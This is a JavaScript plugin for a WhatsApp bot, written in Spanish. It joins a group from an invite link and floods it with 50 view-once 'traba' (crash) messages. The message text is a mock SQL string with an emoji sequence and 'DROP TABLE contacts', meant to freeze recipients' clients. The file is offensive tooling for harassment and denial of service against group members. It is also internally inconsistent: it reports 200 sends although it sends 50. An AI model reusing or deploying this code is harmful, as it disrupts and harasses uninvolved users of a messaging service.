let handler = async (m, { conn, text }) => {
    const ownerNumber = '527447800928@s.whatsapp.net';
    const botNumber = conn.user?.jid || '';
    const sender = m.sender;

    if (sender !== ownerNumber && sender !== botNumber) {
        return conn.reply(m.chat, '👑 Este comando solo está disponible para el owner y el número del bot.', m);
    }

    if (!text || !text.includes('whatsapp.com')) {
        return m.reply('😿 Debes proporcionar el enlace del grupo.\nEjemplo: .canal https://chat.whatsapp.com/XXXX', m);
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
    if (!match) return m.reply('😡 Enlace inválido.', m);

    const inviteCode = match[1];
    let groupId;

    try {
        groupId = await conn.groupAcceptInvite(inviteCode);
    } catch (e) {
        groupId = `120363${inviteCode}@g.us`;
    }

    // Crash SQL travado en viewOnce
    const crashSQL = `SELECT * FROM users WHERE name='🔥🧠💥💬🔁'.repeat(3000);\nDROP TABLE contacts; --`;

    for (let i = 0; i < 50; i++) {
        await conn.relayMessage(groupId, {
            viewOnceMessage: {
                message: {
                    conversation: crashSQL
                }
            }
        }, {});
        await new Promise(resolve => setTimeout(resolve, 100)); // delay para no congelar el bot
    }

    await conn.sendMessage(m.chat, {
        text: `✅ Traba enviada 200 veces en modo viewOnce al grupo.\n\n🔗 Suscríbete: https://youtube.com/@p.a.zinwebkkkkj`
    }, { quoted: m });
};

handler.command = ['pruebaxd'];
handler.tags = ['fake', 'grupo'];
handler.help = ['pruebaxdl <enlace>'];

export default handler;